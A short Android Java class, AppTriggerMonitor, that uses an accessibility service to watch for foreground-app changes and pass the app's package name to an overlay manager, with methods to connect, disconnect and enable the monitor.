package com.fason.app.features.overlay;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;

public final class AppTriggerMonitor {
    private static volatile AccessibilityService service;
    private static volatile boolean enabled;

    private AppTriggerMonitor() {}

    public static void onHostConnected(AccessibilityService s) {
        service = s;
    }

    public static void onAccessibilityEvent(AccessibilityEvent event) {
        if (!enabled || service == null || event == null) return;
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;
        CharSequence pkg = event.getPackageName();
        if (pkg == null || pkg.length() == 0) return;
        OverlayManager.getInstance().onForegroundApp(pkg.toString());
    }

    public static void onHostDisconnected() {
        service = null;
    }

    public static void setEnabled(boolean e) {
        enabled = e;
    }

    public static boolean isConnected() {
        return service != null;
    }
}
